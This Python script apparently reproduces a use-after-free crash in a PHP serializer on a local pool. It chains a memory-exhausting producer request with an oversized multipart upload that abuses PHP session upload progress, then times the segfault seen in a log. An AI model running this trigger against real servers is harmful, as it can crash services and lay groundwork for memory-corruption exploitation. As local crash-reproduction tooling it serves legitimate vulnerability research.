#!/usr/bin/env python3
# Reproduce the BG serializer UAF crash on one pool and time each phase.
import socket, sys, time, os, json, argparse, re

B = "----bgBoundary7MA4YWxkTrZu0gW"

def recv_all(s):
    out = b""
    try:
        while True:
            x = s.recv(65536)
            if not x:
                break
            out += x
    except socket.timeout:
        pass
    return out

def http(port, path, body=None, ctype=None, timeout=30):
    s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    t0 = time.time()
    if body is None:
        req = f"GET {path} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nConnection: close\r\n\r\n".encode()
    else:
        req = (f"POST {path} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n"
               f"Content-Type: {ctype}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
    s.sendall(req)
    data = recv_all(s)
    s.close()
    dt = (time.time() - t0) * 1000
    status = data.split(b"\r\n", 1)[0].decode("latin1") if data else "NO-RESPONSE"
    return status, dt, data

def multipart(sid, pad, key="bgupload"):
    parts = []
    def field(n, v):
        parts.append(f"--{B}\r\nContent-Disposition: form-data; name=\"{n}\"\r\n\r\n".encode())
        parts.append(v if isinstance(v, bytes) else v.encode())
        parts.append(b"\r\n")
    field("PHPSESSID", sid)
    if pad:
        field("pad", pad)
    field("PHP_SESSION_UPLOAD_PROGRESS", key)
    parts.append(f"--{B}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\r\nContent-Type: text/plain\r\n\r\n".encode())
    parts.append(b"A")
    parts.append(b"\r\n--%s--\r\n" % B.encode())
    return b"".join(parts), f"multipart/form-data; boundary={B}"

ap = argparse.ArgumentParser()
ap.add_argument("--port", type=int, required=True)
ap.add_argument("--sid", default="padsid1")
ap.add_argument("--pad-len", type=int, default=900000)
ap.add_argument("--pad-byte", type=int, default=0x41)
ap.add_argument("--reps", type=int, default=3)
ap.add_argument("--log", required=True)
ap.add_argument("--n", type=int, default=8000000)
a = ap.parse_args()

pad = bytes([a.pad_byte]) * a.pad_len
body, ctype = multipart(a.sid, pad)

def lines():
    try:
        return open(a.log, "r", errors="replace").read().splitlines()
    except FileNotFoundError:
        return []

out = []
for i in range(a.reps):
    before = len(lines())
    st1, dt1, _ = http(a.port, f"/producer_oom.php?n={a.n}")
    t_cons = time.time()
    st2, dt2, data = http(a.port, "/consumer.php", body, ctype)
    crash_ms = None
    crash_line = None
    deadline = time.time() + 5
    while time.time() < deadline:
        ls = lines()
        new = [l for l in ls[before:] if "exited on signal" in l or "SIGSEGV" in l]
        if new:
            crash_line = new[0]
            crash_ms = (time.time() - t_cons) * 1000
            break
        time.sleep(0.005)
    time.sleep(0.05)
    st3, dt3, pd = http(a.port, "/ping.php", timeout=5)
    out.append({
        "rep": i, "producer": st1.strip(), "producer_ms": round(dt1, 1),
        "consumer": st2.strip(), "consumer_ms": round(dt2, 1),
        "crash_line": crash_line, "crash_after_consumer_ms": None if crash_ms is None else round(crash_ms, 1),
        "ping": st3.strip(), "ping_body": pd.decode("latin1", "replace").strip()[:80],
        "session_after": None,
    })
    print(json.dumps(out[-1]), flush=True)
print(json.dumps({"summary": out}, indent=1))
